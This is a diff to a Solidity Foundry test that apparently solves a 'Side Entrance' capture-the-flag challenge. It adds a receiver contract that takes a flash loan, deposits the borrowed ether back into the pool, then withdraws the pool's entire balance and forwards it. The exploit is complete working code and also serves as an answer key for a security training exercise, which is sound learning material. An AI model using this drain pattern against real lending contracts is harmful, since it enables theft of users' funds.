@@ -3,7 +3,28 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+
+contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address recovery;
+
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(payable(_pool));
+        recovery = _recovery;
+    }
+    receive() external payable {}
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    function withdrawAndForward() external {
+        pool.withdraw();
+        (bool success,) = recovery.call{value: address(this).balance}("");
+        require(success);
+    }
+}
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +66,11 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        FlashLoanEtherReceiver receiver = new FlashLoanEtherReceiver(address(pool), recovery);
+        vm.startPrank(address(receiver));
+        pool.flashLoan(ETHER_IN_POOL);
+        vm.stopPrank();
+        receiver.withdrawAndForward();
     }
 
     /**
